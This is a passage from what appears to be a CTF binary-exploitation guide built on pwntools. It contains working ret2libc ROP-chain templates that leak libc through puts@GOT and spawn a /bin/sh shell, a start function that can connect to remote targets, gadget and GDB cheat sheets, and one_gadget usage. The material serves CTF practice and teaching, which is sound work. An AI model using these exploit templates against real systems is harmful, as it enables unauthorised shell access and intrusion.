# Build ROP chain to leak puts@GOT
payload = flat({
    offset: [
        rop.find_gadget(['pop rdi', 'ret'])[0],
        elf.got['puts'],
        elf.plt['puts'],
        elf.symbols['main']  # Return to main for second exploit
    ]
})

io = process(exe)
io.sendline(payload)
io.recvuntil(b"expected_output")
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
log.info(f"Leaked puts@GOT: {hex(leak)}")

# Calculate libc base
libc.address = leak - libc.symbols['puts']
log.success(f"Libc base: {hex(libc.address)}")
```

**Stage 2: Call system("/bin/sh")**

```python
# Find /bin/sh string in libc
bin_sh = next(libc.search(b'/bin/sh\x00'))

# Build final ROP chain
payload2 = flat({
    offset: [
        rop.find_gadget(['ret'])[0],  # Stack alignment (required for movaps)
        rop.find_gadget(['pop rdi', 'ret'])[0],
        bin_sh,
        libc.symbols['system']
    ]
})

io.sendline(payload2)
io.interactive()
```

### Pattern 4: Auto-Switch Start Function

**Use this template for all pwn scripts:**

```python
from pwn import *

exe = "./vuln"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

def start(argv=[], *a, **kw):
    """Start the exploit in different modes"""
    if args.GDB:
        gdbscript = """
        b *main
        continue
        """
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], int(sys.argv[2]), *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Usage:
# python solve.py              # Local process
# python solve.py GDB          # Debug with GDB
# python solve.py REMOTE IP PORT  # Remote connection
```

### Pattern 5: ROP Chain Construction

```python
from pwn import *

elf = ELF("./vuln")
rop = ROP(elf)

# Method 1: Automatic ROP chain
rop.call('puts', [elf.got['puts']])
rop.call('main')

# Method 2: Manual gadget selection
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

payload = flat({
    offset: [
        ret,              # Stack alignment
        pop_rdi,
        elf.got['puts'],
        elf.plt['puts'],
        elf.symbols['main']
    ]
})
```

## Quick Reference

### Pwntools Essential Commands

| Task | Command |
|------|---------|
| Generate cyclic pattern | `cyclic(500)` |
| Find offset from crash | `cyclic_find(b'caaa')` or `cyclic_find(0x61616161)` |
| Pack 64-bit integer | `p64(0x401000)` |
| Pack 32-bit integer | `p32(0x08048000)` |
| Unpack 64-bit bytes | `u64(data.ljust(8, b'\x00'))` |
| Unpack 32-bit bytes | `u32(data.ljust(4, b'\x00'))` |
| Launch with GDB | `gdb.debug([exe], gdbscript=script)` |
| Connect remote | `remote(host, port)` |
| Local process | `process([exe])` |
| Build structured payload | `flat({offset: [gadget1, gadget2]})` |
| Find ROP gadgets | `rop.find_gadget(['pop rdi', 'ret'])` |
| Search bytes in binary | `next(elf.search(b'/bin/sh'))` |

### Common ROP Gadgets (x86_64)

```python
# System call setup
pop_rdi = 0x400123  # pop rdi; ret (1st argument)
pop_rsi = 0x400456  # pop rsi; ret (2nd argument)
pop_rdx = 0x400789  # pop rdx; ret (3rd argument)
pop_rax = 0x400abc  # pop rax; ret (syscall number)

# Stack alignment (REQUIRED for recent libc)
ret = 0x400001      # ret

# Useful symbols
bin_sh = next(elf.search(b'/bin/sh\x00'))
system = elf.symbols['system']  # or libc.symbols['system']
```

### GDB Essential Commands

```bash
# Pwndbg commands
checksec                    # Check binary protections
vmmap                       # Memory mapping
telescope $rsp 20           # Stack view
cyclic 200                  # Generate pattern
cyclic -l 0x61616161       # Find offset
rop                         # Search ROP gadgets
rop --grep "pop rdi"       # Filter gadgets
got                         # GOT entries
plt                         # PLT entries

# Standard GDB
b *main                     # Breakpoint at address
b *0x401234
x/20gx $rsp                # Examine stack (64-bit)
x/20wx $esp                # Examine stack (32-bit)
x/20i $rip                 # Disassemble
info registers              # Register values
set $rax = 0               # Modify register
```

## CTF-Specific Tips

### Extract Flags Automatically

```python
import re

def extract_flag(data):
    """Extract common CTF flag formats"""
    patterns = [
        r'flag\{[^}]+\}',
        r'FLAG\{[^}]+\}',
        r'CTF\{[^}]+\}',
        r'picoCTF\{[^}]+\}',
        r'HTB\{[^}]+\}',
        r'[a-zA-Z0-9_]+\{[a-zA-Z0-9_@!?-]+\}',
    ]
    
    text = data if isinstance(data, str) else data.decode('latin-1')
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            return match.group(0)
    return None

# Usage
io.recvuntil(b"output")
data = io.recvall()
flag = extract_flag(data)
if flag:
    log.success(f"Flag: {flag}")
```

### One-Gadget Usage

```bash
# Find one-gadgets in libc (requires one_gadget gem)
one_gadget libc.so.6

# Use in exploit
one_gadget = libc.address + 0x4f3d5  # Offset from one_gadget output
payload = flat({offset: one_gadget})
```

## Anti-Patterns (Avoid These)

### ❌ Don't: Skip Static Analysis

```python
# BAD: Jumping straight to buffer overflow without understanding the binary
offset = 72  # Guessed
payload = b'A' * offset + p64(0xdeadbeef)
```

**Why it's bad:** You might miss:
- Easier solutions (hardcoded flags, win functions)
- Critical constraints (length checks, character filters)
- Security mitigations that require different approaches

### ❌ Don't: Hardcode Addresses with PIE/ASLR

```python
# BAD: Hardcoded libc addresses
system_addr = 0x7ffff7a52290  # This won't work with ASLR

# GOOD: Calculate from leak
libc.address = leak - libc.symbols['puts']
system_addr = libc.symbols['system']
```

### ❌ Don't: Forget Stack Alignment

```python
# BAD: Direct call to system() may crash
payload = flat({offset: [pop_rdi, bin_sh, system]})

# GOOD: Add 'ret' gadget for alignment (movaps requirement)
payload = flat({offset: [ret, pop_rdi, bin_sh, system]})
```

### ❌ Don't: Ignore Error Messages

```python
# BAD: Blindly sending payload without checking responses
io.sendline(payload)
io.interactive()

# GOOD: Check for errors and debug
io.sendline(payload)
response = io.recvuntil(b"expected", timeout=2)
if b"error" in response or b"invalid" in response:
    log.error("Exploit failed, check payload")
    exit(1)
io.interactive()
```

## Bundled Resources

### Templates

All templates use the auto-switch start function for easy testing:

- `templates/pwn_basic.py` - Basic buffer overflow template
- `templates/pwn_rop.py` - ROP chain + ret2libc template
- `templates/angr_template.py` - Symbolic execution with angr

### Tools

Helper scripts for common tasks:

- `tools/checksec_quick.sh` - Quick security check wrapper
- `tools/offset_finder.py` - Automated offset calculation
- `tools/leak_parser.py` - Parse and format address leaks
- `tools/libc_lookup.py` - Identify libc version from leaks
- `tools/rop_chain_skeleton.py` - Generate ROP chain templates
- `tools/patch_ld_preload.sh` - Patch binary to use specific libc

### Ghidra Headless Decompilation

- `ghidra_headless/` - Automated decompilation without GUI
- `ghidra_headless/decompile_headless.sh` - Wrapper script for batch decompilation
- `ghidra_headless/DecompileCLI.java` - Ghidra Java script for headless operation
- `ghidra_headless/README.md` - Detailed usage and troubleshooting guide

### Gadget Finders

- `gadgets/find_gadgets_ropgadget.sh` - ROPgadget wrapper
- `gadgets/find_gadgets_ropper.sh` - Ropper wrapper
- `gadgets/find_gadgets_rpplus.sh` - rp++ wrapper
- `gadgets/one_gadget_notes.md` - One-gadget usage guide

### Quick References

- `quickref_gadgets.md` - Common ROP gadgets reference
- `quickref_gdb.md` - GDB command cheatsheet
- `references/gdb_cheatsheet.md` - Detailed GDB guide
- `ret2libc_checklist.md` - Step-by-step ret2libc guide
- `USAGE.md` - Tool usage instructions

### GDB Configuration

- `gdb_init/` - GDB initialization scripts for pwndbg, GEF, peda

## Keywords

pwn, binary exploitation, buffer overflow, stack overflow, ROP, ROP chain, return-oriented programming, shellcode, pwntools, CTF, checksec, cyclic, gadgets, GOT, PLT, libc leak, ret2libc, ret2win, format string, GDB, pwndbg, reverse engineering, binary analysis, exploit development

---



